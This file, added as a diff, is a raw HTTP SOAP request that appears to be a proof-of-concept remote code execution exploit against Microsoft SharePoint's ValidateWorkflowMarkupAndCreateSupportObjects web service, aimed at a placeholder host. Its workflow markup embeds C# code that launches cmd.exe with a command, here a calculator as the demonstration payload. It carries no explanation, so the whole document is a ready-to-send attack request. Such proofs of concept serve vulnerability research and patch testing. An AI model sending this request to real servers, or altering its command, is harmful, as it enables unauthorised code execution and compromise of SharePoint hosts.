@@ -1,0 +1,29 @@
+POST /_vti_bin/webpartpages.asmx HTTP/1.1
+Host: target.com
+Content-Type: text/xml;charset=UTF-8
+SOAPAction: "http://microsoft.com/sharepoint/webpartpages/ValidateWorkflowMarkupAndCreateSupportObjects"
+Content-Length: 1025
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
+
+<?xml version="1.0" encoding="UTF-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+    <soap:Body>
+        <ValidateWorkflowMarkupAndCreateSupportObjects xmlns="http://microsoft.com/sharepoint/webpartpages">
+            <workflowMarkupText><![CDATA[<SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="foobar" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"                 xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">
+ <SequentialWorkflowActivity Enabled="False">
+   <x:Code>
+     Object test = System.Diagnostics.Process.Start("cmd.exe", "/c calc");
+     private void SayHello(object sender,object test)
+     {
+     //ToDo!
+     }
+   </x:Code>
+ </SequentialWorkflowActivity>
+</SequentialWorkflowActivity>]]></workflowMarkupText>
+            <rulesText />
+            <configBlob />
+            <flag>2</flag>
+        </ValidateWorkflowMarkupAndCreateSupportObjects>
+    </soap:Body>
+</soap:Envelope>
